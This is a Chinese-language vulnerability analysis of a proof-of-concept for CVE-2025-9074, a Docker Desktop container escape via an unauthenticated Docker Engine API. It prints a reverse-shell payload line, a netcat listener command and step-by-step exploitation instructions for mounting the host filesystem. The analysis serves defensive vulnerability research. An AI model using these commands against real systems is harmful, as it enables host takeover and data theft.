## CVE-2025-9074 - Docker Desktop (Windows, macOS) 容器逃逸/越权访问

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸/越权访问

**影响应用:** Docker Desktop (Windows, macOS)

**危害等级:** 严重

**CVSS评分:** 9.3

**影响版本:** Docker Desktop 版本低于 4.44.3

**利用条件:** 需要本地恶意Linux容器运行；Docker Engine API未认证暴露于默认子网(192.168.65.7:2375)；无需挂载Docker socket

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-9074是一个影响Docker Desktop应用程序的严重容器逃逸漏洞，CVSS评分为9.3。该漏洞允许在Windows和macOS系统上本地运行的恶意Linux容器，通过未经认证的Docker Engine API绕过隔离机制，从而实现对宿主机的完全控制。攻击者可以在受感染的容器内部，利用Docker Desktop默认将Docker Engine API暴露在内部子网（通常是192.168.65.7:2375）且缺乏认证的缺陷，直接与API交互，创建并启动具有特权挂载（如宿主机根目录）和反向shell的容器，最终实现宿主机接管。

**POC有效性分析：**
该POC是一个功能完备的shell脚本，名为`CVE-2025-9074.sh`，用于演示和利用CVE-2025-9074漏洞。脚本首先通过未经认证的Docker Engine API（默认地址192.168.65.7:2375）获取一个可用的Docker镜像名称，以确保后续容器创建操作的有效性。随后，它构造一个精心设计的JSON负载，请求Docker Engine创建一个新的容器。这个新容器被设计为在启动时执行一个反向shell命令（`bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1`），并在此过程中将宿主机的根目录（在macOS/Linux上为`/`，在Windows上为`C:\`）通过`HostConfig.Binds`挂载到容器内部的指定路径。最后，脚本启动这个恶意容器。一旦容器成功启动，反向shell将尝试连接到攻击者指定的监听IP和端口，从而为攻击者提供对宿主机的命令行访问权限。同时，宿主机文件系统的特权挂载允许攻击者在容器内部直接访问和修改宿主机的文件，实现完整的宿主机控制和数据窃取。该POC的有效性高，它精确地利用了Docker Desktop在特定配置下Docker Engine API缺乏认证的缺陷，以及允许从容器内直接访问该API的机制，从而绕过容器隔离，实现主机级别的权限提升和远程代码执行。脚本代码结构清晰，易于理解和执行，且不依赖复杂环境或非标准工具（仅需bash和curl），证实了漏洞的可利用性。

**利用步骤：**
1.  **准备监听器：** 攻击者需要在其控制的机器上（即`LHOST`）启动一个网络监听器，例如使用`netcat -lvnp <LPORT>`来监听反向shell的连接。POC脚本中推荐的端口是9002。
2.  **获取或植入恶意容器：** 攻击者需设法在目标Docker Desktop环境中运行一个恶意的Linux容器，或者利用已存在的容器通过某种方式执行POC脚本。该恶意容器必须能够访问Docker Desktop的内部网络。
3.  **执行POC脚本：** 在恶意容器内部，攻击者执行提供的POC脚本，并传入Docker Engine API的IP和端口（通常默认为`192.168.65.7 2375`），以及攻击者监听器的IP和端口。例如：`sh CVE-2025-9074.sh 192.168.65.7 2375 <攻击者IP> <攻击者端口>`。
4.  **建立反向Shell：** POC脚本会利用未经认证的Docker Engine API权限，创建并启动一个包含反向shell载荷和宿主机文件系统挂载配置的恶意容器。
5.  **宿主机控制：** 恶意容器启动后，会尝试连接到攻击者的监听器，建立反向shell。一旦连接成功，攻击者将获得宿主机的shell权限，并通过预先挂载的目录（如`/host_root_win`或`/host_root_nix`）直接访问宿主机的文件系统，从而实现对宿主机的完全控制。

**投毒风险分析：**
该POC代码的投毒风险被评估为低，百分比约为10%。主要基于以下几点分析：
1.  **代码透明性：** POC代码是一个标准的shell脚本，其逻辑清晰、易于阅读和理解。脚本中没有发现明显的混淆技术、加密字符串、动态代码生成或任何试图隐藏其真实意图的行为。
2.  **核心功能：** POC的核心功能是利用漏洞获取反向shell并挂载宿主机文件系统。这是漏洞利用的预期行为，旨在演示漏洞的严重性和潜在影响，不应被误判为额外的恶意投毒。反向shell本身是渗透测试和漏洞利用中的常见工具，其目的是提供远程控制而非执行额外恶意行为。
3.  **依赖项：** 脚本主要依赖于`curl`命令与Docker Engine API进行HTTP交互，以及`bash`命令来生成和执行反向shell。这些都是Linux环境中常见的标准工具，没有引入不寻常或可疑的外部依赖项或库。
4.  **无外部恶意组件：** 代码中没有嵌入或尝试下载外部恶意脚本、二进制文件或指向可疑资源的链接。所有的操作都直接在POC脚本内部完成，并且其行为与描述的漏洞利用过程完全一致。
5.  **预期目的：** 考虑到这是作为防御性安全研究的一部分进行分析，该POC的目的是为了安全研究人员能够复现漏洞、理解其机制并评估其威胁，以便构建有效的防御措施。在实际生产环境中，用户应始终警惕任何来源不明的POC代码，但在防御性研究范畴内，此POC可视为相对“干净”且用于教育目的的代码。因此，虽然它实现了完整的宿主机控制，但其本身不包含超出漏洞利用范围的“投毒”行为。

**项目地址:** null

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-9074
